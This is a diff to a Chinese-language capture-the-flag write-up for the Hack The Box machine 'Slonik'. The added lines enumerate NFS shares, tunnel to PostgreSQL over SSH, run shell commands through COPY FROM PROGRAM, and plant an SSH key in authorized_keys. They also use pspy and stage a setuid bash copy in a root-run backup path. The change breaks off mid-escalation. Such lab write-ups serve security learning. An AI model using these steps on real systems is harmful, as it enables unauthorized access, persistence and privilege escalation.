@@ -1,6 +1,13 @@
 ## Slonik
 ### 总结
 ```
+所有端口的 TTL 值均显示为 63，这与一跳之外的 Linux 系统的预期 TTL 值相符
+showmount -e将列出NFS上可用的挂载点（份额）：
+[★]$ showmount -e 10.129.234.160
+Export list for 10.129.234.160:
+/var/backups *
+/home        *
+
 [★]$ mkdir /tmp/nfs
 [★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
 [★]$ ls -la /tmp/nfs
@@ -59,7 +66,65 @@ service@htb-xybs8a7uq9:/etc/postgresql/15/main$ systemctl status postgresql
     Process: 27073 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
    Main PID: 27073 (code=exited, status=0/SUCCESS)
         CPU: 1ms
-service@htb-xybs8a7uq9:/etc/postgresql/15/main$ 
+service@htb-xybs8a7uq9:/etc/postgresql/15/main$
+
+//数据库 postgres
+[★]$ ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
+[★]$ psql -h /tmp -U postgres
+postgres=# \du
+postgres=# \c
+postgres=# \l
+postgres=# \c service
+service=# \dt
+service=# select * from users;
+
+service=# CREATE TABLE cmd(output text); 
+service=# COPY cmd FROM  PROGRAM 'id'; 
+COPY 1
+service=# select * from cmd; 
+service=# COPY cmd FROM PROGRAM 'mkdir -p /var/lib/postgresql/.ssh';
+COPY 0
+service=# COPY cmd FROM PROGRAM 'chmod 700 /var/lib/postgresql/.ssh';
+COPY 0
+
+[~][★]$ ssh-keygen -t ed25519 //本地生成公钥
+[~][★]$ cat /home/syareya55/.ssh/id_ed25519.pub
+
+service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@htb-y688w65shk') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
+COPY 1
+service=# COPY cmd FROM PROGRAM 'cat /var/lib/postgresql/.ssh/authorized_keys';
+COPY 1
+service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@htb-y688w65shk') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
+COPY 1
+service=# COPY cmd FROM PROGRAM 'cat /var/lib/postgresql/.ssh/authorized_keys';
+COPY 1
+
+[~/.ssh][★]$ ssh -i id_ed25519 postgres@10.129.234.160
+pspy：https://github.com/DominicBreuker/pspy
+[~/.ssh][★]$ scp -i id_ed25519 pspy64 postgres@10.129.234.160:/dev/shm/  //上传
+
+[~/.ssh][★]$ ssh -i id_ed25519 postgres@10.129.234.160
+postgres@slonik:~$ cd /dev/shm
+postgres@slonik:/dev/shm$ ls
+PostgreSQL.2952396296  pspy64
+postgres@slonik:/dev/shm$ chmod +x pspy64
+postgres@slonik:/dev/shm$ ./pspy64
+2026/03/11 08:49:03 CMD: UID=0    PID=17985  | /usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/ 
+2026/03/11 08:49:03 CMD: UID=0    PID=17982  | /bin/bash /usr/bin/backup 
+
+//存在一些差异：
+postgres@slonik:~/14/main$ diff <(ls -1) <(ls /opt/backups/current/ -1) //这里发现/opt/backups/current/  无法复制到/bin/bash /usr/bin/backup 
+1a2,3
+> backup_label
+> backup_manifest
+20,21d21
+< postmaster.opts
+< postmaster.pid
+
+//所以手动复制给它，root权限可以复制/bin/bash，不需要/usr/bin/backup 
+postgres@slonik:~/14/main$ cp /bin/bash .
+
+postgres@slonik:~/14/main$ chmod 6777 bash
 ```
 ```
 [★]$ nmap -sV -sC 10.129.234.160
